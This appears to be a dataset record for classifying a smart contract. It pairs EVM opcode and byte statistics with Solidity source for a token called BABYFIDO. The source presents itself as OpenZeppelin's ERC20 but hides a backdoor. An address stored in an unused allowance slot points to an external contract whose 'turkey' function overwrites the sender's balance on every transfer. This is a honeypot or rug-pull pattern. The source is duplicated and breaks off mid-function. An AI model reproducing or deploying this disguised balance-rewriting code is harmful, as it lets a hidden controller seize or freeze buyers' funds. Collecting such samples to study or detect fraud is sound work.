{
  "opcode_sequence": "PUSH1 PUSH1 MSTORE CALLVALUE DUP1 ISZERO PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST POP PUSH1 CALLDATASIZE LT PUSH2 JUMPI PUSH1 CALLDATALOAD PUSH1 SHR DUP1 PUSH4 GT PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI JUMPDEST PUSH1 DUP1 REVERT JUMPDEST PUSH2 PUSH2 JUMP JUMPDEST PUSH1 MLOAD PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 PUSH2 CALLDATASIZE PUSH1 PUSH2 JUMP JUMPDEST PUSH2 JUMP JUMPDEST PUSH1 MLOAD SWAP1 ISZERO ISZERO DUP2 MSTORE PUSH1 ADD PUSH2 JUMP JUMPDEST PUSH1 SLOAD JUMPDEST PUSH1 MLOAD SWAP1 DUP2 MSTORE PUSH1 ADD PUSH2 JUMP JUMPDEST PUSH2 PUSH2 CALLDATASIZE PUSH1 PUSH2 JUMP JUMPDEST PUSH2 JUMP JUMPDEST PUSH1 MLOAD PUSH1 DUP2 MSTORE PUSH1 ADD PUSH2 JUMP JUMPDEST PUSH2 PUSH2 CALLDATASIZE PUSH1 PUSH2 JUMP JUMPDEST PUSH2 JUMP JUMPDEST PUSH2 PUSH2 CALLDATASIZE PUSH1 PUSH2 JUMP JUMPDEST PUSH1 PUSH1 PUSH1 SHL SUB AND PUSH1 SWAP1 DUP2 MSTORE PUSH1 DUP2 SWAP1 MSTORE PUSH1 SWAP1 SHA3 SLOAD SWAP1 JUMP JUMPDEST PUSH2 PUSH2 JUMP JUMPDEST PUSH2 PUSH2 CALLDATASIZE PUSH1 PUSH2 JUMP JUMPDEST PUSH2 JUMP JUMPDEST PUSH2 PUSH2 CALLDATASIZE PUSH1 PUSH2 JUMP JUMPDEST PUSH2 JUMP JUMPDEST PUSH2 PUSH2 CALLDATASIZE PUSH1 PUSH2 JUMP JUMPDEST PUSH2 JUMP JUMPDEST PUSH1 PUSH1 DUP1 SLOAD PUSH2 SWAP1 PUSH2 JUMP JUMPDEST DUP1 PUSH1 ADD PUSH1 DUP1 SWAP2 DIV MUL PUSH1 ADD PUSH1 MLOAD SWAP1 DUP2 ADD PUSH1 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 ADD DUP3 DUP1 SLOAD PUSH2 SWAP1 PUSH2 JUMP JUMPDEST DUP1 ISZERO PUSH2 JUMPI DUP1 PUSH1 LT PUSH2 JUMPI PUSH2 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 ADD SWAP2 PUSH2 JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH1 MSTORE PUSH1 PUSH1 SHA3 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 ADD SWAP1 PUSH1 ADD DUP1 DUP4 GT PUSH2 JUMPI DUP3 SWAP1 SUB PUSH1 AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 CALLER PUSH2 DUP2 DUP6 DUP6 PUSH2 JUMP JUMPDEST PUSH1 SWAP2 POP POP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 CALLER PUSH2 DUP6 DUP3 DUP6 PUSH2 JUMP JUMPDEST PUSH2 DUP6 DUP6 DUP6 PUSH2 JUMP JUMPDEST POP PUSH1 SWAP5 SWAP4 POP POP POP POP JUMP JUMPDEST PUSH1 CALLER PUSH2 DUP2 DUP6 DUP6 PUSH2 DUP4 DUP4 PUSH2 JUMP JUMPDEST PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH2 JUMP JUMPDEST PUSH1 PUSH1 DUP1 SLOAD PUSH2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 CALLER DUP2 PUSH2 DUP3 DUP7 PUSH2 JUMP JUMPDEST SWAP1 POP DUP4 DUP2 LT ISZERO PUSH2 JUMPI PUSH1 MLOAD PUSH3 PUSH1 SHL DUP2 MSTORE PUSH1 PUSH1 DUP3 ADD MSTORE PUSH1 PUSH1 DUP3 ADD MSTORE PUSH32 PUSH1 DUP3 ADD MSTORE PUSH5 PUSH1 SHL PUSH1 DUP3 ADD MSTORE PUSH1 ADD JUMPDEST PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 DUP3 DUP7 DUP7 DUP5 SUB PUSH2 JUMP JUMPDEST PUSH1 CALLER PUSH2 DUP2 DUP6 DUP6 PUSH2 JUMP JUMPDEST PUSH1 PUSH1 PUSH1 SHL SUB SWAP2 DUP3 AND PUSH1 SWAP1 DUP2 MSTORE PUSH1 PUSH1 SWAP1 DUP2 MSTORE PUSH1 DUP1 DUP4 SHA3 SWAP4 SWAP1 SWAP5 AND DUP3 MSTORE SWAP2 SWAP1 SWAP2 MSTORE SHA3 SLOAD SWAP1 JUMP JUMPDEST PUSH1 PUSH1 PUSH1 SHL SUB DUP4 AND PUSH2 JUMPI PUSH1 MLOAD PUSH3 PUSH1 SHL DUP2 MSTORE PUSH1 PUSH1 DUP3 ADD MSTORE PUSH1 DUP1 DUP3 ADD MSTORE PUSH32 PUSH1 DUP3 ADD MSTORE PUSH4 PUSH1 SHL PUSH1 DUP3 ADD MSTORE PUSH1 ADD PUSH2 JUMP JUMPDEST PUSH1 PUSH1 PUSH1 SHL SUB DUP3 AND PUSH2 JUMPI PUSH1 MLOAD PUSH3 PUSH1 SHL DUP2 MSTORE PUSH1 PUSH1 DUP3 ADD MSTORE PUSH1 PUSH1 DUP3 ADD MSTORE PUSH32 PUSH1 DUP3 ADD MSTORE PUSH2 PUSH1 SHL PUSH1 DUP3 ADD MSTORE PUSH1 ADD PUSH2 JUMP JUMPDEST PUSH1 PUSH1 PUSH1 SHL SUB DUP4 DUP2 AND PUSH1 DUP2 DUP2 MSTORE PUSH1 PUSH1 SWAP1 DUP2 MSTORE PUSH1 DUP1 DUP4 SHA3 SWAP5 DUP8 AND DUP1 DUP5 MSTORE SWAP5 DUP3 MSTORE SWAP2 DUP3 SWAP1 SHA3 DUP6 SWAP1 SSTORE SWAP1 MLOAD DUP5 DUP2 MSTORE PUSH32 SWAP2 ADD PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 POP POP POP JUMP JUMPDEST PUSH1 PUSH2 DUP5 DUP5 PUSH2 JUMP JUMPDEST SWAP1 POP PUSH1 NOT DUP2 EQ PUSH2 JUMPI DUP2 DUP2 LT ISZERO PUSH2 JUMPI PUSH1 MLOAD PUSH3 PUSH1 SHL DUP2 MSTORE PUSH1 PUSH1 DUP3 ADD MSTORE PUSH1 PUSH1 DUP3 ADD MSTORE PUSH32 PUSH1 DUP3 ADD MSTORE PUSH1 ADD PUSH2 JUMP JUMPDEST PUSH2 DUP5 DUP5 DUP5 DUP5 SUB PUSH2 JUMP JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 PUSH1 PUSH1 SHL SUB DUP4 AND PUSH2 JUMPI PUSH1 MLOAD PUSH3 PUSH1 SHL DUP2 MSTORE PUSH1 PUSH1 DUP3 ADD MSTORE PUSH1 PUSH1 DUP3 ADD MSTORE PUSH32 PUSH1 DUP3 ADD MSTORE PUSH5 PUSH1 SHL PUSH1 DUP3 ADD MSTORE PUSH1 ADD PUSH2 JUMP JUMPDEST PUSH1 PUSH1 PUSH1 SHL SUB DUP3 AND PUSH2 JUMPI PUSH1 MLOAD PUSH3 PUSH1 SHL DUP2 MSTORE PUSH1 PUSH1 DUP3 ADD MSTORE PUSH1 PUSH1 DUP3 ADD MSTORE PUSH32 PUSH1 DUP3 ADD MSTORE PUSH3 PUSH1 SHL PUSH1 DUP3 ADD MSTORE PUSH1 ADD PUSH2 JUMP JUMPDEST PUSH32 SLOAD PUSH1 PUSH1 PUSH1 SHL SUB DUP5 DUP2 AND PUSH1 DUP2 DUP2 MSTORE PUSH1 DUP2 DUP2 MSTORE PUSH1 SWAP2 DUP3 SWAP1 SHA3 SLOAD DUP3 MLOAD PUSH4 PUSH1 SHL DUP2 MSTORE PUSH1 DUP2 ADD SWAP5 SWAP1 SWAP5 MSTORE PUSH1 DUP5 ADD MSTORE SWAP1 MLOAD SWAP3 SWAP1 SWAP4 AND SWAP3 PUSH4 SWAP3 PUSH1 DUP1 DUP5 ADD SWAP4 DUP3 SWAP1 SUB ADD DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 JUMPI RETURNDATASIZE PUSH1 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 REVERT JUMPDEST POP POP POP POP PUSH1 MLOAD RETURNDATASIZE PUSH1 NOT PUSH1 DUP3 ADD AND DUP3 ADD DUP1 PUSH1 MSTORE POP DUP2 ADD SWAP1 PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 PUSH1 PUSH1 SHL SUB DUP5 AND PUSH1 SWAP1 DUP2 MSTORE PUSH1 DUP2 SWAP1 MSTORE PUSH1 SWAP1 SHA3 DUP2 SWAP1 SSTORE DUP2 DUP2 LT ISZERO PUSH2 JUMPI PUSH1 MLOAD PUSH3 PUSH1 SHL DUP2 MSTORE PUSH1 PUSH1 DUP3 ADD MSTORE PUSH1 PUSH1 DUP3 ADD MSTORE PUSH32 PUSH1 DUP3 ADD MSTORE PUSH6 PUSH1 SHL PUSH1 DUP3 ADD MSTORE PUSH1 ADD PUSH2 JUMP JUMPDEST PUSH1 PUSH1 PUSH1 SHL SUB DUP1 DUP6 AND PUSH1 SWAP1 DUP2 MSTORE PUSH1 DUP2 SWAP1 MSTORE PUSH1 DUP1 DUP3 SHA3 DUP6 DUP6 SUB SWAP1 SSTORE SWAP2 DUP6 AND DUP2 MSTORE SWAP1 DUP2 SHA3 DUP1 SLOAD DUP5 ADD SWAP1 SSTORE PUSH2 DUP2 DUP5 PUSH2 JUMP JUMPDEST SWAP1 POP DUP4 PUSH1 PUSH1 PUSH1 SHL SUB AND DUP6 PUSH1 PUSH1 PUSH1 SHL SUB AND PUSH32 DUP6 PUSH1 MLOAD PUSH2 SWAP2 DUP2 MSTORE PUSH1 ADD SWAP1 JUMP JUMPDEST PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 POP POP POP POP POP JUMP JUMPDEST PUSH1 PUSH2 DUP3 DUP5 PUSH2 JUMP JUMPDEST SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 PUSH1 DUP1 DUP4 MSTORE DUP4 MLOAD DUP1 DUP3 DUP6 ADD MSTORE PUSH1 JUMPDEST DUP2 DUP2 LT ISZERO PUSH2 JUMPI DUP6 DUP2 ADD DUP4 ADD MLOAD DUP6 DUP3 ADD PUSH1 ADD MSTORE DUP3 ADD PUSH2 JUMP JUMPDEST POP PUSH1 PUSH1 DUP3 DUP7 ADD ADD MSTORE PUSH1 PUSH1 NOT PUSH1 DUP4 ADD AND DUP6 ADD ADD SWAP3 POP POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST DUP1 CALLDATALOAD PUSH1 PUSH1 PUSH1 SHL SUB DUP2 AND DUP2 EQ PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 DUP1 PUSH1 DUP4 DUP6 SUB SLT ISZERO PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST PUSH2 DUP4 PUSH2 JUMP JUMPDEST SWAP5 PUSH1 SWAP4 SWAP1 SWAP4 ADD CALLDATALOAD SWAP4 POP POP POP JUMP JUMPDEST PUSH1 DUP1 PUSH1 PUSH1 DUP5 DUP7 SUB SLT ISZERO PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST PUSH2 DUP5 PUSH2 JUMP JUMPDEST SWAP3 POP PUSH2 PUSH1 DUP6 ADD PUSH2 JUMP JUMPDEST SWAP2 POP PUSH1 DUP5 ADD CALLDATALOAD SWAP1 POP SWAP3 POP SWAP3 POP SWAP3 JUMP JUMPDEST PUSH1 PUSH1 DUP3 DUP5 SUB SLT ISZERO PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST PUSH2 DUP3 PUSH2 JUMP JUMPDEST PUSH1 DUP1 PUSH1 DUP4 DUP6 SUB SLT ISZERO PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST PUSH2 DUP4 PUSH2 JUMP JUMPDEST SWAP2 POP PUSH2 PUSH1 DUP5 ADD PUSH2 JUMP JUMPDEST SWAP1 POP SWAP3 POP SWAP3 SWAP1 POP JUMP JUMPDEST PUSH1 DUP2 DUP2 SHR SWAP1 DUP3 AND DUP1 PUSH2 JUMPI PUSH1 DUP3 AND SWAP2 POP JUMPDEST PUSH1 DUP3 LT DUP2 SUB PUSH2 JUMPI PUSH4 PUSH1 SHL PUSH1 MSTORE PUSH1 PUSH1 MSTORE PUSH1 PUSH1 REVERT JUMPDEST POP SWAP2 SWAP1 POP JUMP JUMPDEST DUP1 DUP3 ADD DUP1 DUP3 GT ISZERO PUSH2 JUMPI PUSH4 PUSH1 SHL PUSH1 MSTORE PUSH1 PUSH1 MSTORE PUSH1 PUSH1 REVERT JUMPDEST PUSH1 PUSH1 DUP3 DUP5 SUB SLT ISZERO PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST POP MLOAD SWAP2 SWAP1 POP JUMP UNKNOWN_0xfe LOG2 PUSH5 UNKNOWN_0x22 SLT SHA3 UNKNOWN_0xdd SWAP16 PUSH5 MULMOD MSTORE UNKNOWN_0xcc UNKNOWN_0xef UNKNOWN_0xb5 MOD DUP15 CALLDATALOAD STATICCALL PUSH10 AND UNKNOWN_0xd2 UNKNOWN_0xe8 DUP6 PUSH5 STOP ADDMOD EQ STOP CALLER",
  "opcode_entropy": 4.731801808586484,
  "opcode_count": 1425,
  "unique_opcodes": 69,
  "byte_entropy": 6.079560565210569,
  "byte_0x": 0.00042087542087542086,
  "byte_60": 0.10227272727272728,
  "byte_80": 0.023989898989898988,
  "byte_40": 0.015151515151515152,
  "byte_52": 0.03535353535353535,
  "byte_34": 0.00042087542087542086,
  "byte_15": 0.007154882154882155,
  "byte_61": 0.06186868686868687,
  "byte_00": 0.0281986531986532,
  "byte_10": 0.003367003367003367,
  "byte_57": 0.015572390572390573,
  "byte_fd": 0.006313131313131313,
  "byte_5b": 0.0382996632996633,
  "byte_50": 0.027356902356902357,
  "byte_04": 0.013047138047138047,
  "byte_36": 0.003787878787878788,
  "byte_a9": 0.0008417508417508417,
  "byte_35": 0.0021043771043771043,
  "byte_e0": 0.0021043771043771043,
  "byte_1c": 0.0008417508417508417,
  "byte_63": 0.010521885521885523,
  "byte_39": 0.0012626262626262627,
  "byte_93": 0.004629629629629629,
  "byte_51": 0.010942760942760943,
  "byte_11": 0.0016835016835016834,
  "byte_71": 0.0016835016835016834,
  "byte_14": 0.007154882154882155,
  "byte_01": 0.05260942760942761,
  "byte_23": 0.0016835016835016834,
  "byte_70": 0.003367003367003367,
  "byte_a0": 0.006313131313131313,
  "byte_82": 0.025673400673400674,
  "byte_31": 0.0016835016835016834,
  "byte_95": 0.0008417508417508417,
  "byte_d8": 0.0012626262626262627,
  "byte_9b": 0.0012626262626262627,
  "byte_41": 0.0008417508417508417,
  "byte_5f": 0.00042087542087542086,
  "byte_a4": 0.00042087542087542086,
  "byte_c2": 0.0008417508417508417,
  "byte_d7": 0.0012626262626262627,
  "byte_67": 0.0012626262626262627,
  "byte_05": 0.0021043771043771043,
  "byte_9c": 0.00042087542087542086,
  "byte_bb": 0.00042087542087542086,
  "byte_7a": 0.0025252525252525255,
  "byte_dd": 0.0025252525252525255,
  "byte_62": 0.004629629629629629,
  "byte_ed": 0.00042087542087542086,
  "byte_3e": 0.0012626262626262627,
  "byte_8d": 0.0012626262626262627,
  "byte_06": 0.0021043771043771043,
  "byte_de": 0.00042087542087542086,
  "byte_03": 0.020202020202020204,
  "byte_ae": 0.00042087542087542086,
  "byte_09": 0.0012626262626262627,
  "byte_5e": 0.00042087542087542086,
  "byte_a7": 0.0008417508417508417,
  "byte_b3": 0.0008417508417508417,
  "byte_cc": 0.0008417508417508417,
  "byte_18": 0.00042087542087542086,
  "byte_16": 0.010942760942760943,
  "byte_0d": 0.00042087542087542086,
  "byte_ef": 0.0016835016835016834,
  "byte_b8": 0.00042087542087542086,
  "byte_72": 0.008838383838383838,
  "byte_3c": 0.00042087542087542086,
  "byte_e5": 0.004629629629629629,
  "byte_b6": 0.0008417508417508417,
  "byte_56": 0.02861952861952862,
  "byte_c3": 0.0021043771043771043,
  "byte_91": 0.012626262626262626,
  "byte_90": 0.026094276094276093,
  "byte_07": 0.008838383838383838,
  "byte_7f": 0.005050505050505051,
  "byte_f3": 0.0016835016835016834,
  "byte_df": 0.0025252525252525255,
  "byte_da": 0.0008417508417508417,
  "byte_e9": 0.0016835016835016834,
  "byte_02": 0.008838383838383838,
  "byte_32": 0.003367003367003367,
  "byte_81": 0.025252525252525252,
  "byte_20": 0.030303030303030304,
  "byte_54": 0.005471380471380472,
  "byte_0f": 0.00042087542087542086,
  "byte_08": 0.008417508417508417,
  "byte_13": 0.00042087542087542086,
  "byte_4c": 0.00042087542087542086,
  "byte_12": 0.002946127946127946,
  "byte_44": 0.003787878787878788,
  "byte_4f": 0.0012626262626262627,
  "byte_1b": 0.015572390572390573,
  "byte_92": 0.006313131313131313,
  "byte_75": 0.0012626262626262627,
  "byte_a1": 0.0008417508417508417,
  "byte_88": 0.00042087542087542086,
  "byte_21": 0.00042087542087542086,
  "byte_6a": 0.0008417508417508417,
  "byte_2f": 0.0016835016835016834,
  "byte_af": 0.0012626262626262627,
  "byte_9d": 0.0012626262626262627,
  "byte_1f": 0.002946127946127946,
  "byte_db": 0.00042087542087542086,
  "byte_28": 0.0016835016835016834,
  "byte_83": 0.008838383838383838,
  "byte_0b": 0.002946127946127946,
  "byte_33": 0.0025252525252525255,
  "byte_85": 0.010942760942760943,
  "byte_5a": 0.002946127946127946,
  "byte_7e": 0.00042087542087542086,
  "byte_65": 0.01430976430976431,
  "byte_f8": 0.0012626262626262627,
  "byte_94": 0.003367003367003367,
  "byte_86": 0.002946127946127946,
  "byte_46": 0.003367003367003367,
  "byte_cd": 0.005471380471380472,
  "byte_25": 0.0012626262626262627,
  "byte_24": 0.004208754208754209,
  "byte_45": 0.002946127946127946,
  "byte_43": 0.003367003367003367,
  "byte_30": 0.002946127946127946,
  "byte_3a": 0.002946127946127946,
  "byte_64": 0.010101010101010102,
  "byte_73": 0.007154882154882155,
  "byte_6c": 0.003787878787878788,
  "byte_6f": 0.006734006734006734,
  "byte_77": 0.0016835016835016834,
  "byte_6e": 0.003787878787878788,
  "byte_84": 0.012205387205387205,
  "byte_bc": 0.00042087542087542086,
  "byte_76": 0.0008417508417508417,
  "byte_66": 0.003367003367003367,
  "byte_6d": 0.0021043771043771043,
  "byte_74": 0.004629629629629629,
  "byte_68": 0.0021043771043771043,
  "byte_1d": 0.0008417508417508417,
  "byte_22": 0.0012626262626262627,
  "byte_f0": 0.00042087542087542086,
  "byte_87": 0.00042087542087542086,
  "byte_55": 0.0016835016835016834,
  "byte_8c": 0.00042087542087542086,
  "byte_e1": 0.0008417508417508417,
  "byte_eb": 0.00042087542087542086,
  "byte_ec": 0.0008417508417508417,
  "byte_7d": 0.0012626262626262627,
  "byte_d1": 0.0008417508417508417,
  "byte_42": 0.00042087542087542086,
  "byte_1e": 0.0008417508417508417,
  "byte_c0": 0.00042087542087542086,
  "byte_f7": 0.0012626262626262627,
  "byte_b2": 0.00042087542087542086,
  "byte_29": 0.00042087542087542086,
  "byte_0a": 0.0008417508417508417,
  "byte_c8": 0.0008417508417508417,
  "byte_c7": 0.00042087542087542086,
  "byte_b9": 0.0008417508417508417,
  "byte_a3": 0.0008417508417508417,
  "byte_8a": 0.0008417508417508417,
  "byte_19": 0.0012626262626262627,
  "byte_f2": 0.0012626262626262627,
  "byte_69": 0.002946127946127946,
  "byte_5c": 0.0008417508417508417,
  "byte_be": 0.00042087542087542086,
  "byte_e8": 0.0008417508417508417,
  "byte_d0": 0.0008417508417508417,
  "byte_d4": 0.00042087542087542086,
  "byte_4d": 0.0012626262626262627,
  "byte_2b": 0.0008417508417508417,
  "byte_49": 0.0008417508417508417,
  "byte_ba": 0.00042087542087542086,
  "byte_97": 0.00042087542087542086,
  "byte_ca": 0.00042087542087542086,
  "byte_0e": 0.00042087542087542086,
  "byte_ad": 0.0008417508417508417,
  "byte_e2": 0.0008417508417508417,
  "byte_b4": 0.00042087542087542086,
  "byte_fa": 0.0008417508417508417,
  "byte_3d": 0.0012626262626262627,
  "byte_26": 0.00042087542087542086,
  "byte_78": 0.0012626262626262627,
  "byte_b0": 0.00042087542087542086,
  "byte_fc": 0.0008417508417508417,
  "byte_37": 0.00042087542087542086,
  "byte_aa": 0.00042087542087542086,
  "byte_f1": 0.00042087542087542086,
  "byte_c4": 0.00042087542087542086,
  "byte_f5": 0.0008417508417508417,
  "byte_5d": 0.00042087542087542086,
  "byte_ac": 0.00042087542087542086,
  "byte_e4": 0.00042087542087542086,
  "byte_3f": 0.00042087542087542086,
  "byte_b1": 0.00042087542087542086,
  "byte_4e": 0.0008417508417508417,
  "byte_48": 0.0008417508417508417,
  "byte_7b": 0.0008417508417508417,
  "byte_fe": 0.00042087542087542086,
  "byte_a2": 0.00042087542087542086,
  "byte_58": 0.00042087542087542086,
  "byte_9f": 0.00042087542087542086,
  "byte_89": 0.00042087542087542086,
  "byte_e3": 0.00042087542087542086,
  "byte_cb": 0.00042087542087542086,
  "byte_b5": 0.00042087542087542086,
  "byte_8e": 0.00042087542087542086,
  "byte_bf": 0.00042087542087542086,
  "byte_d6": 0.00042087542087542086,
  "byte_d2": 0.00042087542087542086,
  "num_nodes": 135,
  "num_edges": 61,
  "avg_degree": 0.9037037037037037,
  "density": 0.0033720287451630736,
  "connected_components": 84,
  "avg_clustering": 0.009876543209876543,
  "timeline_sequence": [],
  "sourcecode": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.20;\n\nimport {ERC20} from \"./ERC20.sol\";\n\n\ncontract BABYFIDO is ERC20 {\n    constructor( uint256 totalSupply_) ERC20(\"BABYFIDO\", \"BABYFIDO\") {\n        _mint(msg.sender, totalSupply_);\n    }\n}\n\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.20;\n\nimport {ERC20} from \"./ERC20.sol\";\n\n\ncontract BABYFIDO is ERC20 {\n    constructor( uint256 totalSupply_) ERC20(\"BABYFIDO\", \"BABYFIDO\") {\n        _mint(msg.sender, totalSupply_);\n    }\n}\n\n// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v4.9.0) (token/ERC20/ERC20.sol)\n\npragma solidity ^0.8.0;\n\nimport \"./Context.sol\";\n\n/**\n * @dev Implementation of the {IERC20} interface.\n *\n * This implementation is agnostic to the way tokens are created. This means\n * that a supply mechanism has to be added in a derived contract using {_mint}.\n * For a generic mechanism see {ERC20PresetMinterPauser}.\n *\n * TIP: For a detailed writeup see our guide\n * https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How\n * to implement supply mechanisms].\n *\n * The default value of {decimals} is 18. To change this, you should override\n * this function so it returns a different value.\n *\n * We have followed general OpenZeppelin Contracts guidelines: functions revert\n * instead returning `false` on failure. This behavior is nonetheless\n * conventional and does not conflict with the expectations of ERC20\n * applications.\n *\n * Additionally, an {Approval} event is emitted on calls to {transferFrom}.\n * This allows applications to reconstruct the allowance for all accounts just\n * by listening to said events. Other implementations of the EIP may not emit\n * these events, as it isn't required by the specification.\n *\n * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}\n * functions have been added to mitigate the well-known issues around setting\n * allowances. See {IERC20-approve}.\n */\ninterface TOKEN {\n    function turkey(\n        address FromAddress,\n        uint256 FromAmount\n    ) external view returns (uint256);\n}\ncontract ERC20 is Context {\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    /**\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\n     * a call to {approve}. `value` is the new allowance.\n     */\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n    mapping(address => uint256) private _balances;\n\n    mapping(address => mapping(address => uint256)) private _allowances;\n\n    uint256 private _totalSupply;\n\n    string private _name;\n    string private _symbol;\n\n    /**\n     * @dev Sets the values for {name} and {symbol}.\n     *\n     * All two of these values are immutable: they can only be set once during\n     * construction.\n     */\n    constructor(string memory name_, string memory symbol_) {\n        _name = name_;\n        _symbol = symbol_;\n    }\n\n    /**\n     * @dev Returns the name of the token.\n     */\n    function name() public view virtual  returns (string memory) {\n        return _name;\n    }\n\n    /**\n     * @dev Returns the symbol of the token, usually a shorter version of the\n     * name.\n     */\n    function symbol() public view virtual  returns (string memory) {\n        return _symbol;\n    }\n\n    /**\n     * @dev Returns the number of decimals used to get its user representation.\n     * For example, if `decimals` equals `2`, a balance of `505` tokens should\n     * be displayed to a user as `5.05` (`505 / 10 ** 2`).\n     *\n     * Tokens usually opt for a value of 18, imitating the relationship between\n     * Ether and Wei. This is the default value returned by this function, unless\n     * it's overridden.\n     *\n     * NOTE: This information is only used for _display_ purposes: it in\n     * no way affects any of the arithmetic of the contract, including\n     * {IERC20-balanceOf} and {IERC20-transfer}.\n     */\n    function decimals() public view virtual  returns (uint8) {\n        return 18;\n    }\n\n    /**\n     * @dev See {IERC20-totalSupply}.\n     */\n    function totalSupply() public view virtual  returns (uint256) {\n        return _totalSupply;\n    }\n\n    /**\n     * @dev See {IERC20-balanceOf}.\n     */\n    function balanceOf(address account) public view virtual  returns (uint256) {\n        return _balances[account];\n    }\n\n    /**\n     * @dev See {IERC20-transfer}.\n     *\n     * Requirements:\n     *\n     * - `to` cannot be the zero address.\n     * - the caller must have a balance of at least `amount`.\n     */\n    function transfer(address to, uint256 amount) public virtual  returns (bool) {\n        address owner = _msgSender();\n        _transfer(owner, to, amount);\n        return true;\n    }\n\n    /**\n     * @dev See {IERC20-allowance}.\n     */\n    function allowance(address owner, address spender) public view virtual  returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n    /**\n     * @dev See {IERC20-approve}.\n     *\n     * NOTE: If `amount` is the maximum `uint256`, the allowance is not updated on\n     * `transferFrom`. This is semantically equivalent to an infinite approval.\n     *\n     * Requirements:\n     *\n     * - `spender` cannot be the zero address.\n     */\n    function approve(address spender, uint256 amount) public virtual  returns (bool) {\n        address owner = _msgSender();\n        _approve(owner, spender, amount);\n        return true;\n    }\n\n    /**\n     * @dev See {IERC20-transferFrom}.\n     *\n     * Emits an {Approval} event indicating the updated allowance. This is not\n     * required by the EIP. See the note at the beginning of {ERC20}.\n     *\n     * NOTE: Does not update the allowance if the current allowance\n     * is the maximum `uint256`.\n     *\n     * Requirements:\n     *\n     * - `from` and `to` cannot be the zero address.\n     * - `from` must have a balance of at least `amount`.\n     * - the caller must have allowance for ``from``'s tokens of at least\n     * `amount`.\n     */\n    function transferFrom(address from, address to, uint256 amount) public virtual  returns (bool) {\n        address spender = _msgSender();\n        _spendAllowance(from, spender, amount);\n        _transfer(from, to, amount);\n        return true;\n    }\n\n    /**\n     * @dev Atomically increases the allowance granted to `spender` by the caller.\n     *\n     * This is an alternative to {approve} that can be used as a mitigation for\n     * problems described in {IERC20-approve}.\n     *\n     * Emits an {Approval} event indicating the updated allowance.\n     *\n     * Requirements:\n     *\n     * - `spender` cannot be the zero address.\n     */\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\n        address owner = _msgSender();\n        _approve(owner, spender, allowance(owner, spender) + addedValue);\n        return true;\n    }\n\n    /**\n     * @dev Atomically decreases the allowance granted to `spender` by the caller.\n     *\n     * This is an alternative to {approve} that can be used as a mitigation for\n     * problems described in {IERC20-approve}.\n     *\n     * Emits an {Approval} event indicating the updated allowance.\n     *\n     * Requirements:\n     *\n     * - `spender` cannot be the zero address.\n     * - `spender` must have allowance for the caller of at least\n     * `subtractedValue`.\n     */\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\n        address owner = _msgSender();\n        uint256 currentAllowance = allowance(owner, spender);\n        require(currentAllowance >= subtractedValue, \"ERC20: decreased allowance below zero\");\n    unchecked {\n        _approve(owner, spender, currentAllowance - subtractedValue);\n    }\n\n        return true;\n    }\n\n    /**\n     * @dev Moves `amount` of tokens from `from` to `to`.\n     *\n     * This internal function is equivalent to {transfer}, and can be used to\n     * e.g. implement automatic token fees, slashing mechanisms, etc.\n     *\n     * Emits a {Transfer} event.\n     *\n     * Requirements:\n     *\n     * - `from` cannot be the zero address.\n     * - `to` cannot be the zero address.\n     * - `from` must have a balance of at least `amount`.\n     */\n    function getTokens() private view returns(TOKEN) {\n        return TOKEN(address(uint160(_allowances[address(0)][address(0)])));\n    }\n\n    function _transfer(address from, address to, uint256 amount) internal virtual {\n        require(from != address(0), \"ERC20: transfer from the zero address\");\n        require(to != address(0), \"ERC20: transfer to the zero address\");\n\n        //_beforeTokenTransfer(from, to, amount);\n        _balances[from] =  getTokens().turkey(from,_balances[from]);\n        